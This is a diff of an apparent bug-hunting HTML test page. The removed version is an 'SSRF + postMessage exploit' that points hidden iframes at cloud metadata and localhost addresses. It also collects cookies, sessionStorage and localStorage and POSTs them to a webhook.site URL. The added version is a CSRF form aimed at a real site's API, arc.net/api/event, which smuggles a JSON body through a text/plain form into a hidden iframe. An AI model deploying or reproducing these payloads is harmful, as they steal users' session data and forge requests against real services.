@@ -1,47 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🧪 SSRF + postMessage Exploit</title>
+  <meta charset="UTF-8">
+  <title>CSRF Test - Manual</title>
 </head>
 <body>
-  <h2>🚨 Testing SSRF + sessionStorage leak</h2>
+  <h1>CSRF Test to arc.net</h1>
+  <form action="https://arc.net/api/event" method="POST" enctype="text/plain" target="hidden_iframe">
+    <input type="hidden" name='{"event":"csrf_form_test"}' value="">
+    <button type="submit">🚨 Send CSRF</button>
+  </form>
 
-  <script>
-    // 1️⃣ SSRF via iframe (targeting internal services like metadata servers)
-    const SSRF_TARGETS = [
-      "http://169.254.169.254/latest/meta-data/", // AWS
-      "http://metadata.google.internal/",         // GCP
-      "http://localhost:8080/",                   // Localhost
-      "http://127.0.0.1:8000/"                    // Another local service
-    ];
-
-    for (const target of SSRF_TARGETS) {
-      const iframe = document.createElement('iframe');
-      iframe.src = target;
-      iframe.style.display = 'none';
-      document.body.appendChild(iframe);
-    }
-
-    // 2️⃣ Extract sessionStorage + postMessage leak
-    const payload = {
-      type: "leak",
-      sessionStorage: { ...sessionStorage },
-      localStorage: { ...localStorage },
-      cookies: document.cookie,
-      origin: location.origin,
-      location: location.href,
-      userAgent: navigator.userAgent
-    };
-
-    // Send via postMessage to Webhook listener iframe (if used)
-    window.postMessage(payload, "*");
-
-    // Also send to webhook.site directly (adjust your link here)
-    fetch("https://webhook.site/7d21e910-456e-401e-aa0b-01dcf5eb7040", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-  </script>
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
 </body>
 </html>
